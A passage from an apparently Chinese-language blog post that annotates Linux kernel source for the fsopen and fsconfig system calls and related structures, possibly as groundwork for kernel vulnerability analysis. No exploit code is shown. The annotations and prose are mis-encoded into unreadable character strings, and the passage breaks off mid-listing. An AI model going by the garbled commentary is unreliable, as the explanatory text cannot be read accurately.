class="hljs-comment"> *</span><br><span class="hljs-comment"> * We are allowed to specify a container in which the filesystem will be</span><br><span class="hljs-comment"> * opened, thereby indicating which namespaces will be used (notably, which</span><br><span class="hljs-comment"> * network namespace will be used for network filesystems).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-comment">//ä½¿ç”¨ns_capableå‡½æ•°æ£€æŸ¥å½“å‰è¿›ç¨‹çš„å‘½åç©ºé—´æ˜¯å¦å…·æœ‰CAP_SYS_ADMINæƒé™</span><br><span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><span class="hljs-comment">//æ£€æŸ¥ä¼ å…¥çš„flagså‚æ•°æ˜¯å¦åŒ…å«é™¤äº†FSOPEN_CLOEXECä¹‹å¤–çš„å…¶ä»–ä½</span><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-comment">//ä½¿ç”¨strndup_userå‡½æ•°ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶æ–‡ä»¶ç³»ç»Ÿçš„åç§°ï¼Œè¿™ä¸ªåç§°çš„é•¿åº¦é™åˆ¶ä¸ºPAGE_SIZE</span><br>fs_name = strndup_user(_fs_name, PAGE_SIZE);<br><span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br><span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br><span class="hljs-comment">//æ ¹æ®æ–‡ä»¶ç³»ç»Ÿåç§°è·å–file_system_typeç»“æ„</span><br>fs_type = get_fs_type(fs_name);<br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br><span class="hljs-keyword">return</span> -ENODEV;<br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡fc</span><br>fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>put_filesystem(fs_type);<span class="hljs-comment">//å‡å°‘æ–‡ä»¶ç³»ç»Ÿç±»å‹çš„å¼•ç”¨è®¡æ•°ã€‚</span><br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><span class="hljs-comment">//è¡¨ç¤ºæ­£åœ¨åˆ›å»ºæŒ‚è½½å‚æ•°</span><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><span class="hljs-comment">//åˆ†é…ä¸€ä¸ªæ—¥å¿—ä¸Šä¸‹æ–‡</span><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœflagsåŒ…å«FSOPEN_CLOEXECï¼Œåˆ™ä½¿ç”¨O_CLOEXECæ ‡å¿—</span><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<strong>fs_context</strong>æ˜¯éšç€è¿™ä¸€æ‰¹æ–°çš„ç³»ç»Ÿè°ƒç”¨ä¸€èµ·å¼•å…¥çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br>    <span class="hljs-comment">//æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡å®ä¾‹æŒç»­æœŸé—´ï¼Œæä¾›ç»™æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ä½¿ç”¨çš„ä¼—å¤šæ–¹æ³•ã€‚ä¸€èˆ¬ç”±ç‰¹å®šæ–‡ä»¶ç³»ç»Ÿç±»å‹çš„init_fs_contextæ–¹æ³•æ¥å¯¹å…¶è¿›è¡Œè®¾ç½®ã€‚</span><br>        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span>            <span class="hljs-title">uapi_mutex</span>;</span>     <span class="hljs-comment">/* Userspace access mutex */</span><br>    <span class="hljs-comment">//ç”¨æ¥æŒ‡å‘å³å°†è¢«æŒ‚è½½ï¼ˆæˆ–é‡æ–°é…ç½®ï¼‰çš„æ–‡ä»¶ç³»ç»Ÿæ‰€å±æ–‡ä»¶ç³»ç»Ÿç±»å‹å®ä¾‹çš„æŒ‡é’ˆ</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><br>    <span class="hljs-comment">//æŒ‡å‘æ–‡ä»¶ç³»ç»Ÿç§æœ‰æ•°æ®çš„æŒ‡é’ˆï¼Œå¸¸ç”¨äºå­˜å‚¨éœ€è¦ç‰¹å®šæ–‡ä»¶ç³»ç»Ÿæ¥è§£æçš„é€‰é¡¹</span><br>        <span class="hljs-type">void</span>                    *fs_private;    <span class="hljs-comment">/* The filesystem&#x27;s context */</span><br>        <span class="hljs-type">void</span>                    *sget_key;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>           *<span class="hljs-title">root</span>;</span>          <span class="hljs-comment">/* The root and superblock */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>   *<span class="hljs-title">user_ns</span>;</span>       <span class="hljs-comment">/* The user namespace for this mount */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>              *<span class="hljs-title">net_ns</span>;</span>        <span class="hljs-comment">/* The network namespace for this mount */</span><br>        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>       *<span class="hljs-title">cred</span>;</span>          <span class="hljs-comment">/* The mounter&#x27;s credentials */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>           *<span class="hljs-title">log</span>;</span>           <span class="hljs-comment">/* Logging buffer */</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *source;        <span class="hljs-comment">/* The source name (eg. dev path) */</span><br>        <span class="hljs-type">void</span>                    *security;      <span class="hljs-comment">/* Linux S&amp;M options */</span><br>        <span class="hljs-type">void</span>                    *s_fs_info;     <span class="hljs-comment">/* Proposed s_fs_info */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            sb_flags;       <span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            sb_flags_mask;  <span class="hljs-comment">/* Superblock flags that were changed */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            s_iflags;       <span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            lsm_flags;      <span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span> <span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span>   <span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;        <span class="hljs-comment">/* The phase the context is in */</span><br>        <span class="hljs-type">bool</span>                    need_free:<span class="hljs-number">1</span>;    <span class="hljs-comment">/* Need to call ops-&gt;free() */</span><br>        <span class="hljs-type">bool</span>                    global:<span class="hljs-number">1</span>;       <span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>PSï¼šæ³¨æ„è¿™é‡Œæ‰“å¼€çš„ä¸æ˜¯ä¸€ä¸ªå…·ä½“çš„<code>on-disk</code>æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚&#x2F;dev&#x2F;sdb1ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿ)ï¼Œè€Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿâ€œç±»å‹â€</p><p>è·å–äº†é’ˆå¯¹æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶æè¿°ç¬¦åï¼Œæ¥ä¸‹æ¥æ­¥éª¤æ˜¯ä½¿ç”¨**fsconfig()**æ¥å¯¹è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡è¿›è¡Œé…ç½®</p><h2 id="fsconfig"><a href="#fsconfig" class="headerlink" title="fsconfig"></a>fsconfig</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¦ç»†ä¸€ç‚¹çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * sys_fsconfig - Set parameters and trigger actions on a context</span><br><span class="hljs-comment"> * @fd: The filesystem context to act upon</span><br><span class="hljs-comment"> * @cmd: The action to take</span><br><span class="hljs-comment"> * @_key: Where appropriate, the parameter key to set</span><br><span class="hljs-comment"> * @_value: Where appropriate, the parameter value to set</span><br><span class="hljs-comment"> * @aux: Additional information for the value</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This system call is used to set parameters on a context, including</span><br><span class="hljs-comment"> * superblock settings, data source and security labelling.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Actions include triggering the creation of a superblock and the</span><br><span class="hljs-comment"> * reconfiguration of the superblock attached to the specified context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * When setting a parameter, @cmd indicates the type of value being proposed</span><br><span class="hljs-comment"> * and @_key indicates the parameter to be altered.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @_value and @aux are used to specify the value, should a value be required:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_flag: No value is specified.  The parameter must be boolean</span><br><span class="hljs-comment"> *     in nature.  The key may be prefixed with &quot;no&quot; to invert the</span><br><span class="hljs-comment"> *     setting. @_value must be NULL and @aux must be 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_string: A string value is specified.  The parameter can be</span><br><span class="hljs-comment"> *     expecting boolean, integer, string or take a path.  A conversion to an</span><br><span class="hljs-comment"> *     appropriate type will be attempted (which may include looking up as a</span><br><span class="hljs-comment"> *     path).  @_value points to a NUL-terminated string and @aux must be 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_binary: A binary blob is specified.  @_value points to the</span><br><span class="hljs-comment"> *     blob and @aux indicates its size.  The parameter must be expecting a</span><br><span class="hljs-comment"> *     blob.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path: A non-empty path is specified.  The parameter must be</span><br><span class="hljs-comment"> *     expecting a path object.  @_value points to a NUL-terminated string that</span><br><span class="hljs-comment"> *     is the path and @aux is a file descriptor at which to start a relative</span><br><span class="hljs-comment"> *     lookup or AT_FDCWD.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path_empty: As fsconfig_set_path, but with AT_EMPTY_PATH</span><br><span class="hljs-comment"> *     implied.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_fd: An open file descriptor is specified.  @_value must be</span><br><span class="hljs-comment"> *     NULL and @aux indicates the file descriptor.</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><span class="hljs-type">int</span> lookup_flags = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//å®šä¹‰äº†ä¸€ä¸ªstruct fs_parameter paramå˜é‡</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-comment">//ä¸€å †switch</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br><span class="hljs-keyword">if</span> (!_key || _value || aux)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-keyword">if</span> (!_key || !_value || aux)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">if</span> (!_key || !_value || aux &lt;= <span class="hljs-number">0</span> || aux &gt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br><span class="hljs-keyword">if</span> (!_key || _value || aux &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_CMD_CREATE:<br><span class="hljs-keyword">case</span> FSCONFIG_CMD_RECONFIGURE:<br><span class="hljs-keyword">if</span> (_key || _value || aux)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br><br>f = fdget(fd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br>ret = -EINVAL;<br>    <span class="hljs-comment">//åˆ¤æ–­å½“å‰é€šè¿‡fdå¾—åˆ°çš„æ–‡ä»¶å®ä¾‹çš„æ–¹æ³•é›†æ˜¯ä¸æ˜¯fscontext_fops</span><br><span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br><span class="hljs-keyword">goto</span> out_f;<br><br>fc = f.file-&gt;private_data;<br><span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>ret = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><span class="hljs-comment">//æŠŠè¿™ä¸ªå­—ç¬¦ä¸²èµ‹å€¼åˆ°param.key</span><br><span class="hljs-keyword">if</span> (_key) &#123;<br>param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>ret = PTR_ERR(param.key);<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><span class="hljs-comment">//æ ¹æ®ä¸åŒçš„cmdï¼Œç¡®å®šä¸åŒçš„æ“ä½œ</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br>param.type = fs_value_is_flag;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br>param.type = fs_value_is_blob;<br>param.size = aux;<br>param.blob = memdup_user_nul(_value, aux);<br><span class="hljs-keyword">if</span> (IS_ERR(param.blob)) &#123;<br>ret = PTR_ERR(param.blob);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br>lookup_flags = LOOKUP_EMPTY;<br><span class="hljs-comment">/* fallthru */</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br>param.type = fs_value_is_filename;<br>param.name = getname_flags(_value, lookup_flags, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.name)) &#123;<br>ret = PTR_ERR(param.name);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.dirfd = aux;<br>param.size = <span class="hljs-built_in">strlen</span>(param.name-&gt;name);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>param.type = fs_value_is_file;<br>ret = -EBADF;<br>param.file = fget(aux);<br><span class="hljs-keyword">if</span> (!param.file)<br><span class="hljs-keyword">goto</span> out_key;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//åŠ é”</span><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123;<br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<span class="hljs-comment">//very important</span><br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br><span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment"> * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment"> * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br>kfree(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">if</span> (param.name)<br>putname(param.name);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br><span class="hljs-keyword">if</span> (param.file)<br>fput(param.file);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>out_key:<br>kfree(param.key);<br>out_f:<br>fdput(f);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸€ä¸ªç»“æ„ä½“å˜é‡ï¼Œè¿™ä¸ªå˜é‡å°†ç”¨äºä¸‹é¢çš„ä¸€ç³»åˆ—æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>                .type   = fs_value_is_undefined,<br>        &#125;;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹<code>define</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> &#123;</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *key;           <span class="hljs-comment">/* Parameter name */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_value_type</span>      <span class="hljs-title">type</span>:</span><span class="hljs-number">8</span>;         <span class="hljs-comment">/* The type of value here */</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-type">char</span>            *<span class="hljs-built_in">string</span>;<br>                <span class="hljs-type">void</span>            *blob;<br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">filename</span> *<span class="hljs-title">name</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>     *<span class="hljs-title">file</span>;</span><br>        &#125;;<br>        <span class="hljs-type">size_t</span>  size;<br>        <span class="hljs-type">int</span>     dirfd;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="vfs-fsconfig-locked"><a href="#vfs-fsconfig-locked" class="headerlink" title="vfs_fsconfig_locked"></a><strong>vfs_fsconfig_locked</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 